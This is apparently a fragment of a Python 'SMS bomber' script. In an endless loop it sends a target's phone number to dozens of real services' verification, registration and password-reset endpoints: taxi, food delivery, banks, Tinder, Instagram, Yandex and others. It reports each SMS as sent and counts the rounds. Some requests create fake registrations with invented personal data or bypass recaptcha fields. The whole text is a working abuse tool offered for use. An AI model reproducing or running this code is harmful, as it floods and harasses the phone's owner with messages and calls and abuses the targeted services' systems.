while True:
      _email = _name+f'{iteration}'+'@gmail.com'
      email = _email
      try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        print(Fore.GREEN+"RUTAXI отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
        print(Fore.GREEN+"TINDER отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        print(Fore.GREEN+"KARUSEL отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print(Fore.GREEN+"MTSTV отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print(Fore.GREEN+"YOULA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
        print(Fore.GREEN+"CITILINK отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print(Fore.GREEN+"FINDCLONE отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print(Fore.GREEN+"SUNLIGHT отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print(Fore.GREEN+"KFC отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print(Fore.GREEN+"ICQ отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
        print(Fore.GREEN+"CLOUD.MAIL отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone})
        print(Fore.GREEN+"OK отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
        print(Fore.GREEN+"TWITCH отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': _phone, 'recaptcha_challenge_field':''})
        print(Fore.GREEN+"INSTAGRAM отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://vladikavkaz.edostav.ru/site/CheckAuthLogin', data={"phone_or_email":_phone}, headers={"Host": "vladikavkaz.edostav.ru", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "26"})
        print(Fore.GREEN+"EDOSTAV отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
        print(Fore.GREEN+"FIX-PRICE отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
        print(Fore.GREEN+"IQOS отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
        print(Fore.GREEN+"IVI отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone})
        print(Fore.GREEN+"MY.GAMES отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0})
        print(Fore.GREEN+"OZON отправлено."+Style.RESET_ALL+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"})
        print(Fore.GREEN+"SMART.SPACE отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone9dostavista})
        print(Fore.GREEN+"DOSTAVISTA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone})
        print(Fore.GREEN+"EDA.YANDEX отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
        print(Fore.GREEN+"VSK отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"})
        print(Fore.GREEN+"TELE2 отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print(Fore.GREEN+"GRABTAXI отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        print(Fore.GREEN+"BELKACAR отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print(Fore.GREEN+"RABOTA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
        print(Fore.GREEN+"RUTUBE отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
        print(Fore.GREEN+"SMSINT отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
        print(Fore.GREEN+"OYOROOMS отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""})
        print(Fore.GREEN+"MVIDEO отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print(Fore.GREEN+"NEWNEXT отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        print(Fore.GREEN+"ALPARI отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
        print(Fore.GREEN+"SBIS отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print(Fore.GREEN+"PSBANK отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print(Fore.GREEN+"BELTELECOM отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print(Fore.GREEN+"CARSMILE отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
        print(Fore.GREEN+"TERRA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
        print(Fore.GREEN+"SMSGOROD отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
        print(Fore.GREEN+"CABINET.WI-FI отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
        print(Fore.GREEN+"WOWWORKS отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
        print(Fore.GREEN+"ANYTIME отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print(Fore.GREEN+"DELIVERY-CLUB отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://alfalife.cc/auth.php", data={"phone": _phone})
        print(Fore.GREEN+"ALFALIFE отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone})
        print(Fore.GREEN+"BENZUBER отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},})
        print(Fore.GREEN+"CLOUDLOYALTY отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,})
        print(Fore.GREEN+"DELITIME отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone})
        print(Fore.GREEN+"FINAM отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone})
        print(Fore.GREEN+"LENTA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone})
        print(Fore.GREEN+"OLLIS отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
        print(Fore.GREEN+"QLEAN отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone})
        print(Fore.GREEN+"REDMONDEDA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"})
        print(Fore.GREEN+"SBERFOOD отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0})
        print(Fore.GREEN+"SHOPANDSHOW отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone})
        print(Fore.GREEN+"SPINET отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.get("https://www.sportmaster.ru/",params={"module": "users", "action": "SendSMSReg", "phone": _phone})
        print(Fore.GREEN+"SPORTMASTER отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone})
        print(Fore.GREEN+"TINKOFF отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone})
        print(Fore.GREEN+"CHEF.YANDEX отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
        print(Fore.GREEN+"PIZZAHUT отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post('https://plink.tech/register/',json={"phone": _phone})
        print(Fore.GREEN+"PLINK отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + _phone9})
        print(Fore.GREEN+"PANPIZZA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": _phone})
        print(Fore.GREEN+"SUSHI-MASTER отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": _phone,})
        print(Fore.GREEN+"SUANSSHI отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + _phone, "ajax_demo_send": "1"})
        print(Fore.GREEN+"SMS4B отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29", data={"caller_number": _phone})
        print(Fore.GREEN+"SALAMPAY отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://mousam.ru/api/checkphone", data={"phone": _phone, "target": "android app v0.0.2"})
        print(Fore.GREEN+"MOUSAM отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": russian_name, "phone": _phone})
        print(Fore.GREEN+"MOS.PIZZA отправлено."+Style.RESET_ALL)
      except:
        pass
      try:
        requests.post("https://ggbet.ru/api/auth/register-with-phone", data={"phone": "+" + _phone, "login": email, "password": password, "agreement": "on", "oferta": "on"})
        print(Fore.GREEN+"GGBET отправлено."+Style.RESET_ALL)
      except:
        pass
      iteration += 1
      print(('{} круг пройден.').format(iteration))
